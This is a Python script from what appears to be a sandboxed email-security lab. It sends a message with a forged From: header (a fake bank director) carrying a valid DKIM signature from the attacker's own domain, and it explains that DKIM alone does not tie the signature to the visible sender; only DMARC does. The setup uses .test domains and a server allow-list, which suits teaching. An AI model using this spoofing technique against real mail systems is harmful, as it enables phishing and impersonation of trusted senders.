"""A4 — Firma con su propio dominio: el From: dice «director@bancoseguro.test», pero el
atacante firma con DKIM usando SU dominio (d=atacante.test) y su llave a2026.

La firma es criptográficamente válida (dkim=pass), solo que prueba que el correo viene
de atacante.test. DKIM no compara d= con el From: visible; eso lo hace DMARC.

Uso dentro del contenedor:  python3 -m ataques.a4_firma_propia [--para X] [--servidor Y]
"""

from __future__ import annotations

import argparse
import sys

from ataques.comun import (
    ALLOWED_SERVER,
    DEFAULT_RECIPIENT,
    Attack,
    AttackResult,
    DestinationError,
    send_simple,
)

ATTACK = Attack(
    id="A4",
    description="Firma con su propio dominio",
    envelope_from="rebote@atacante.test",
    header_from="director@bancoseguro.test",
    dkim="d=atacante.test (selector a2026)",
)


def launch(recipient: str = DEFAULT_RECIPIENT, server: str = ALLOWED_SERVER) -> AttackResult:
    return send_simple(ATTACK, recipient, server, sign_with=("atacante.test", "a2026"))


def main() -> int:
    parser = argparse.ArgumentParser(description=f"{ATTACK.id}: {ATTACK.description}")
    parser.add_argument("--para", default=DEFAULT_RECIPIENT, help="destinatario (.test)")
    parser.add_argument("--servidor", default=ALLOWED_SERVER, help="servidor SMTP (receptor)")
    args = parser.parse_args()
    try:
        result = launch(args.para, args.servidor)
    except DestinationError as error:
        print(f"ABORTADO: {error}", file=sys.stderr)
        return 2
    print(result.transcript)
    return 0 if result.accepted else 1


if __name__ == "__main__":
    sys.exit(main())
